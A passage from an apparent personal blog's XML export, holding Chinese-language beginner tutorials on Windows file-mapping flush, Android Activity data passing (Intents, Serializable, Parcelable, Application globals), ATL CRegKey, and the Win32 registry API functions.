<h2 id="立即刷新-FlushViewOfFile"><a href="#立即刷新-FlushViewOfFile" class="headerlink" title="立即刷新 FlushViewOfFile"></a>立即刷新 <code>FlushViewOfFile</code></h2><p>立即刷新，如果不是的话呢就和之前的文件操作一样，关闭的时候才会（删除对象的时候才会立即刷新）。<br>函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FlushViewOfFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBaseAddress,       <span class="comment">// start address of byte range to flush</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwNumberOfBytesToFlush <span class="comment">// number of bytes in range</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>最后一个参数还是0的话呢是全部。</p>
<p>先介绍的这里，之后介绍实例。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity全局对象传递数据</title>
    <url>/2020/01/29/Activity%E5%85%A8%E5%B1%80%E5%AF%B9%E8%B1%A1%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="Activity全局对象传送数据"><a href="#Activity全局对象传送数据" class="headerlink" title="Activity全局对象传送数据"></a>Activity全局对象传送数据</h1><p>其实这个全局对象呢，我感觉这个名字听得总是怪怪的，确实没有Windows气的名字好听说实话的，在Windows下也称这个东西叫做实例对象，就是在winmain函数传递过来的那个instance，这里的话呢也是，这里也需要说一下这个安卓程序的一个入口点</p>
<h2 id="安卓程序的入口点"><a href="#安卓程序的入口点" class="headerlink" title="安卓程序的入口点"></a>安卓程序的入口点</h2><p>安卓程序的入口点其实和MFC基本上是大同小异，学多了我感觉这两个没啥太大的区别，同样的MFC是有一个全局的APP变量，由于是一启动就初始化，所以在它里面写东西，就有点像初始化，在安卓中呢，是一个类继承了Application这个类，例如下面：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppcationTest</span> <span class="keyword">extends</span> <span class="title">Application</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String Name;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		Name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继承了Application，然后重写onCreate函数，这个函数应该是必须要的吧，然后在我们的Manifest中定义我们的实例对象：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">android:name=".AppcationTest"</span><br></pre></td></tr></table></figure>
<p>这个样子我们就进行了定义，上面配置就是说我们的入口类是哪个（我那个单词拼写错了，我也就没改）<br>改完之后我们就可以在传输断这么写：</p>
<ol>
<li>输入端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = (AppcationTest)getApplication();</span><br><span class="line">app.setName(<span class="string">"Test"</span>);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在接收端这么写：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = (AppcationTest)getApplication();</span><br><span class="line">Log.d(<span class="string">"ooo"</span>, app.getName());</span><br></pre></td></tr></table></figure>
<p>这个样子我们就进行了数据传递。</p>
<h2 id="程序的优化"><a href="#程序的优化" class="headerlink" title="程序的优化"></a>程序的优化</h2><p>我们可以观察到，我们有一个<code>getApplication</code>这个么一个方法，其实在MFC中这个函数是全局的（类似于AfxXXX），但是这个地方这个方法是来自于Activity这个类的，所以我们要想获得的话呢必须要继承Activity这个，这就很麻烦了，所以我们想到了可以使用静态的一个方法，具体实现方法如下：</p>
<ol>
<li>全局对象</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> AppcationTest instance = <span class="keyword">new</span> AppcationTest();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> AppcationTest <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>输入端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = AppcationTest.getInstance();</span><br><span class="line">app.setName(<span class="string">"Test"</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>接收端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = AppcationTest.getInstance();</span><br><span class="line">Log.d(<span class="string">"ooo"</span>, app.getName());</span><br></pre></td></tr></table></figure>

<p>这个样子我们就能很方便的进行数据的传输了。</p>
<p>但是我们发现当我们的程序十分的大的时候我们的数据变量会是非常的多，因为我们的全局对象会有很多的变量，所以我们在这个时候我们就会想到Map集合，这个东西我也是刚了解没多久（我也是学习java没多久的时间）</p>
<p>具体如何实现呢？看下面示例代码：</p>
<ol>
<li>全局对象：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String,Object&gt;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> HashMap&lt;String, Object&gt; <span class="title">getMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>输入端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = AppcationTest.getInstance();</span><br><span class="line">app.getMap().put(<span class="string">"Name"</span>, <span class="string">"Wker"</span>);</span><br><span class="line">app.getMap().put(<span class="string">"Age"</span>, <span class="number">19</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>接收端：</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AppcationTest app = AppcationTest.getInstance();</span><br><span class="line">Log.d(<span class="string">"ooo"</span>, (String) app.getMap().get(<span class="string">"Name"</span>));</span><br><span class="line">Log.d(<span class="string">"ooo"</span>, (Integer) app.getMap().get(<span class="string">"Age"</span>)+<span class="string">""</span>);</span><br></pre></td></tr></table></figure>

<p>这个样子我们的代码就优化完毕了。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity数据传递2</title>
    <url>/2020/01/29/Activity%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%922/</url>
    <content><![CDATA[<h2 id="Activity数据传递通过静态变量"><a href="#Activity数据传递通过静态变量" class="headerlink" title="Activity数据传递通过静态变量"></a>Activity数据传递通过静态变量</h2><p>之前说可以通过一些方法进行数据的传递，其实仔细想一下，我们无非就是在类中进行数据集的交互罢了，所以我们可以是用静态变量这种方法进行数据的传递。</p>
<ol>
<li>传递类</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">push2</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String Name;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		Name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>输入端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> push2 cs = <span class="keyword">new</span> push2();</span><br><span class="line">cs.setName(<span class="string">"aaa"</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>接收端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> push2 obj = <span class="keyword">new</span> push2();</span><br><span class="line">obj = MainActivity.cs;</span><br><span class="line">Log.d(<span class="string">"test"</span>, obj.getName());</span><br></pre></td></tr></table></figure>

<p>这个样子我们就实现了类中的数据传递，<br>还有一种方法就是在<br>但是有一点我们需要注意就是在窗口返回和销毁的时候我们需要将我们的这个成员变量进行销毁。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>.onDestroy();</span><br><span class="line">	obj = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个样子就可以进行数据传递了</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity数据传递</title>
    <url>/2020/01/29/Activity%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92/</url>
    <content><![CDATA[<h1 id="Activity之间的数据传递"><a href="#Activity之间的数据传递" class="headerlink" title="Activity之间的数据传递"></a>Activity之间的数据传递</h1><p>这个就比较典型，就和Windows下一样，但是比Windows下方便许多，只需要调用几个比较简单的方法就可以进行数据的传递。</p>
<h2 id="基本数据类型的传递"><a href="#基本数据类型的传递" class="headerlink" title="基本数据类型的传递"></a>基本数据类型的传递</h2><p>基本数据类型的传递是最简单得了相比之下，我们只需要使用一个成员方法写入数据就可以了，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">intent.putExtra(<span class="string">"Data"</span>,test);</span><br></pre></td></tr></table></figure>
<p>这个<code>putExtra</code>方法有许多重载，基本数据类型都包含了，在我们的接收端我们只需要调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bundle bundle = getIntent().getExtras();</span><br><span class="line">bundle.getString(<span class="string">"Data"</span>);</span><br></pre></td></tr></table></figure>
<p>这个样子我们就能成功进行数据之间的交互了。</p>
<h2 id="类的传递"><a href="#类的传递" class="headerlink" title="类的传递"></a>类的传递</h2><p>类的传递分为两种方法，一种是Java自带的，另一种是Android提供给我们的，各有好处，下面进行介绍。</p>
<h3 id="序列化传递"><a href="#序列化传递" class="headerlink" title="序列化传递"></a>序列化传递</h3><p>序列化的传递方法，就是将我们的类实现序列化，然后再传递的时候使用就好了，这个方法也是比较简单的，但是是有缺点的，因为序列化是持久化的一个操作，所以会在本地生成数据，具体的实现方法：</p>
<ol>
<li>传递类</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">push</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String Name;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetName</span> <span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		Name = name;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">GetName</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>发送端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">push test = <span class="keyword">new</span> push();</span><br><span class="line">test.SetName(<span class="string">"iii"</span>);</span><br><span class="line">intent.putExtra(<span class="string">"Data"</span>,test);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>接收端</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> EditText edt01;</span><br><span class="line">edt01 = (EditText)findViewById(R.id.editText1);</span><br><span class="line">edt01.setText(((push)bundle.get(<span class="string">"Data"</span>)).GetName());</span><br></pre></td></tr></table></figure>
<p>这个样子就可以进行数据的交互了，多了一步序列化和强制转换，也是相对而言方便的。</p>
<h3 id="Parcelable传递"><a href="#Parcelable传递" class="headerlink" title="Parcelable传递"></a>Parcelable传递</h3><p>这个方法有点繁琐，但是比较固定，就是说不是太需要理解为啥这样写，反正按模式进行些就好了，我们同样还是先写类：</p>
<ol>
<li>传递类</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.lx;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.location.Criteria;</span><br><span class="line"><span class="keyword">import</span> android.os.Parcel;</span><br><span class="line"><span class="keyword">import</span> android.os.Parcelable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">push</span> <span class="keyword">implements</span> <span class="title">Parcelable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String Name;</span><br><span class="line">	<span class="keyword">private</span> String Age;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SetName</span> <span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		Name = name;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">GetName</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Parcelable.Creator&lt;push&gt; CREATOR = <span class="keyword">new</span> Creator&lt;push&gt;() &#123;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> push <span class="title">createFromParcel</span><span class="params">(Parcel source)</span> </span>&#123;</span><br><span class="line">			push test = <span class="keyword">new</span> push();</span><br><span class="line">			test.setAge(source.readString());</span><br><span class="line">			test.SetName(source.readString());</span><br><span class="line">			<span class="keyword">return</span> test;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">public</span> push[] newArray(<span class="keyword">int</span> size) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;;</span><br><span class="line">			</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">		dest.writeString(Age);</span><br><span class="line">		dest.writeString(Name);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> Age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(String age)</span> </span>&#123;</span><br><span class="line">		Age = age;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发送端接收端不变，和我们序列化的时候操作是一样的，这里稍微有一写要说的。</p>
<ul>
<li>必须要有个静态成员<code>public static Parcelable.Creator&lt;push&gt; CREATOR = new Creator&lt;push&gt;()</code>然后实现里面的两个方法</li>
<li><code>writeToParcel</code>这个里面的顺序要和<code>createFromParcel</code>这个里面的顺序是一致的，否则应该会出现错误</li>
<li><code>createFromParcel</code>这个方法最后需要返回我们new的那个对象。</li>
</ul>
<p>这个方法的好处其实就是不是本地写入，是在内存中进行读写，而且速度要快一些，但是就是有一点繁琐。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>CRegKey</title>
    <url>/2020/01/29/CRegKey/</url>
    <content><![CDATA[<h2 id="CRegKey"><a href="#CRegKey" class="headerlink" title="CRegKey"></a><code>CRegKey</code></h2><p>之前说的这个忘记加上去了，补充一下，这个的话呢其实就是说方便我们的调用。<br>比较特殊的是这个类不是MFC的，而是<code>#include &lt;atlbase.h&gt;</code><br>而且类的函数比较简单，调用起来十分的方便。</p>
<ul>
<li>Attach Attaches a registry key handle to the CRegKey object.  </li>
<li>Close Releases m_hKey.  </li>
<li>Create Creates or opens the specified key.  </li>
<li>CRegKey Constructor.  </li>
<li>DeleteSubKey Deletes the specified key.  </li>
<li>DeleteValue Deletes a value field of the key identified by m_hKey.  </li>
<li>Detach Detaches m_hKey from the CRegKey object.  </li>
<li>Open Opens the specified key.  </li>
<li>QueryValue Retrieves the data for a specified value field.  </li>
<li>RecurseDeleteKey Deletes the specified key and explicitly deletes all subkeys.  </li>
<li>SetKeyValue Stores data in a specified value field of a specified key.  </li>
<li>SetValue Stores data in a specified value field.<br>但是有一点需要注意，如果想要立即写入的话呢要调用Flush方法，这个在我这个2001年的MSDN好像没有说明。</li>
</ul>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>注册表操作</title>
    <url>/2020/01/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="注册表介绍"><a href="#注册表介绍" class="headerlink" title="注册表介绍"></a>注册表介绍</h1><p>下面内容摘自网络：<a href="http://www.sohu.com/a/232058468_99914465" target="_blank" rel="noopener">http://www.sohu.com/a/232058468_99914465</a></p>
<p>注册表的结构包括六大分支（有的是五大分支，如果是五大分支，就没有hkey-dyn-data这一结构），注册表编辑器与资源管理器的界面相似。</p>
<p>注册表编辑器左窗格显示六大分支，右窗格是相应的键值项。我们编辑注册表，就是修改和增加相应的键值项。</p>
<p>注册表的六大分支结构如下：</p>
<p>hkey-classes-root该主关键字包含了有关的OLE信息，以便在系统工作过程中实现对各种文件和文档信息的访问。具体的内容有已经注册的文件扩展名、文件类型、文件图标等。</p>
<p>hkey-current-user是一个指向HKEY_USERS结构中某个分支的指针，它包含当前用户的登录信息。实际上它就是HKEY_USERS＼Default下面的一部分内容，如果在HKEY_USERS＼Default下面没有用户登录的其它内容，那么这两个主关键字包含的内容是完全相同的。</p>
<p>hkey-local-machine该关键字包含了本地计算机（相对网络环境而言）的硬件和软件的全部信息。当系统的配置和设置发生变化时，本关键字下面的登录项也将随之改变。</p>
<p>hkey-users 所有登录用户的信息。</p>
<p>hkey-current-config这个关键字实际上也是指向HKEY_LOCAL _MACHINE＼Config结构中的某个分支的指针。HKEY_CURRENT_CONFIG下面的子关键字及内容与HKEY_LOCAL _MACHINE＼Config＼0001分支下面的子关键字及内容是完全相同的。本关键字包含的主要内容是计算机的当前配置情况，如显示器、打印机等可选外部设备及其设置信息等，而且这个配置信息均将根据当前连接的网络类型、硬件配置以及应用软件的安装不同而有所变化。</p>
<p>hkey-dyn-data 即插即用和系统性能的动态信息。</p>
<p>对于 Windows98 来说包含了六个主键，而在 Windows 2003/2000/XP 中没有 HKEY_DYN_DATA 主键，所以对于 Windows 2003/2000/XP 来说只有五个主键。</p>
<p>注册表中的键值项数据可分为如下三种类型：</p>
<p>1.字符串值（S）</p>
<p>在Windows98的注册表中，表示文件的描述、硬件的标识等等信息一般都用字符串值。字符串值由字母和数字组成，它的最大长度不能超过255个字符。通过键、键值就组成了一种键值项数据，这就相当于Win.ini、Ssytem.ini文件中每个小节下面的设置行一样的道理。</p>
<p>2.二进制值（B）</p>
<p>在Windows的注册表中，二进制值是没有长度限制的，可以是任意个字节长。在注册表编辑器中，二进制以十六进制的方式显示出来。</p>
<p>3.DWORD值（D）</p>
<p>在Windwos98的注册表中，DWORD值是一个32位（双字节长）长度的数值。在注册表编辑器中，系统以十六进制的方式显示DWORD值。</p>
<p>主要是我不想敲键盘了哈哈哈。<br>那么我们看一下微软给我们编写他的一些操作函数吧。</p>
<h2 id="打开关闭子键RegCreateKeyEx与RegCloseKey"><a href="#打开关闭子键RegCreateKeyEx与RegCloseKey" class="headerlink" title="打开关闭子键RegCreateKeyEx与RegCloseKey"></a>打开关闭子键<code>RegCreateKeyEx</code>与<code>RegCloseKey</code></h2><p>关闭打开是操作注册表最基本的一些操作了，首先是<code>RegCreateKeyEx</code>这个函数参数有点多，但是还是很好理解的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegCreateKeyEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,                <span class="comment">// handle to an open key</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpSubKey,         <span class="comment">// address of subkey name</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD Reserved,           <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpClass,           <span class="comment">// address of class string</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwOptions,          <span class="comment">// special options flag</span></span></span></span><br><span class="line"><span class="function"><span class="params">  REGSAM samDesired,        <span class="comment">// desired security access</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="comment">// address of key security structure</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PHKEY phkResult,          <span class="comment">// address of buffer for opened handle</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpdwDisposition   <span class="comment">// address of disposition value buffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>hKey</code>：这个值其实是一个之前已经打开的键或者说是那六个根键</li>
</ol>
<ul>
<li>HKEY_CLASSES_ROOT</li>
<li>HKEY_CURRENT_CONFIG</li>
<li>HKEY_CURRENT_USER</li>
<li>HKEY_LOCAL_MACHINE</li>
<li>HKEY_USERS</li>
<li>Windows NT: HKEY_PERFORMANCE_DATA </li>
<li>Windows 95 and Windows 98: HKEY_DYN_DATA </li>
</ul>
<ol start="2">
<li><code>lpSubKey</code>：指向以null结尾的字符串的指针，该字符串指定此函数打开或创建的子键的名称。指定的子键必须是由hKey参数标识的键的子键。此子键不能以反斜杠字符(‘&#39;)开头。此参数不能为空。</li>
<li><code>dwOptions</code>：指定键的特殊选项。此参数可以是以下值之一。</li>
</ol>
<ul>
<li>REG_OPTION_NON_VOLATILE   重启不丢失</li>
<li>REG_OPTION_VOLATILE       重启丢失</li>
<li>REG_OPTION_BACKUP_RESTORE </li>
</ul>
<ol start="4">
<li><code>samDesired</code>：可以是下面这几个值：</li>
</ol>
<ul>
<li>KEY_ALL_ACCESS Combination of KEY_QUERY_VALUE, KEY_ENUMERATE_SUB_KEYS, KEY_NOTIFY, KEY_CREATE_SUB_KEY, KEY_CREATE_LINK, and KEY_SET_VALUE access. </li>
<li>KEY_CREATE_LINK Permission to create a symbolic link. </li>
<li>KEY_CREATE_SUB_KEY Permission to create subkeys. </li>
<li>KEY_ENUMERATE_SUB_KEYS Permission to enumerate subkeys. </li>
<li>KEY_EXECUTE Permission for read access. </li>
<li>KEY_NOTIFY Permission for change notification. </li>
<li>KEY_QUERY_VALUE Permission to query subkey data. </li>
<li>KEY_READ Combination of KEY_QUERY_VALUE, KEY_ENUMERATE_SUB_KEYS, and KEY_NOTIFY access. </li>
<li>KEY_SET_VALUE Permission to set subkey data. </li>
<li>KEY_WRITE Combination of KEY_SET_VALUE and KEY_CREATE_SUB_KEY access. </li>
</ul>
<ol start="5">
<li><code>phkResult</code>这个返回我们打开的一个句柄。</li>
<li><code>lpdwDisposition</code>：下面这几个值：</li>
</ol>
<ul>
<li>REG_CREATED_NEW_KEY The key did not exist and was created. </li>
<li>REG_OPENED_EXISTING_KEY The key existed and was simply opened without being changed. </li>
</ul>
<p>还是比较好理解的，英语看不懂的稍微百度一下就好了，一般看名字就知道什么意思了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegCloseKey</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey   <span class="comment">// handle to key to close</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这个及时用来关闭的，就一个参数。</p>
<h2 id="删除子键RegDeleteKey"><a href="#删除子键RegDeleteKey" class="headerlink" title="删除子键RegDeleteKey"></a>删除子键<code>RegDeleteKey</code></h2><p>删除一个子键用函数：<code>RegDeleteKey</code><br>参数很是简单：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegDeleteKey</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,         <span class="comment">// handle to open key</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpSubKey   <span class="comment">// address of name of subkey to delete</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>但是在这里需要注意的是，只有所有有关这个子键的句柄都被关闭了之后才会删除完毕，而且好像在老板的电脑里面我们的这个函数是不支持递归删除的，现在好像已经支持了，再说了，在往前几年，都不用注册表，用个什么C盘里面的ini配置文件我记得，当时32位操作系统还没有很普及，这个应该是16位操作系统时候的了，具体的我也忘记了，反正是很老了。</p>
<h2 id="键值操作"><a href="#键值操作" class="headerlink" title="键值操作"></a>键值操作</h2><p>首先是设置一个键值，我们用到的函数是：<code>RegSetValueEx</code>，函数的原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegSetValueEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,           <span class="comment">// handle to key to set value for</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpValueName, <span class="comment">// name of the value to set</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD Reserved,      <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwType,        <span class="comment">// flag for value type</span></span></span></span><br><span class="line"><span class="function"><span class="params">  CONST BYTE *lpData,  <span class="comment">// address of value data</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD cbData         <span class="comment">// size of value data</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>dwType</code>这个参数是用来设置一些flag的，具体的可以是下面几个值（比较常用的我复制的是）：</li>
</ol>
<ul>
<li>REG_BINARY</li>
<li>REG_DWORD</li>
<li>REG_EXPAND_SZ</li>
<li>REG_MULTI_SZ</li>
<li>REG_SZ</li>
</ul>
<p>其他参数都是比较好理解的。</p>
<p>读取键值：<code>RegQueryValueEx</code>，函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">RegQueryValueEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey,           <span class="comment">// handle to key to query</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPTSTR lpValueName,  <span class="comment">// address of name of value to query</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpReserved,  <span class="comment">// reserved</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpType,      <span class="comment">// address of buffer for value type</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE lpData,       <span class="comment">// address of data buffer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcbData     <span class="comment">// address of data buffer size</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这个函数基本上没啥太大的难度，但是这种函数又是比较典型的二次函数（我自己起的名字），意思就是说这种函数我们在调用的过程中我们需要调用两次。<br>主要的特别之处在于我们的最后一个参数的长度是不确定的，所以我们在第一次调用这个函数的时候可以读取数据类型，如果类型符合我们就读取实际数据。<br>主要的特点：</p>
<ol>
<li><code>lpData</code>这个参数设置为NULL的时候我们的<code>lpcbData</code>这个参数返回我们的真是数据长度</li>
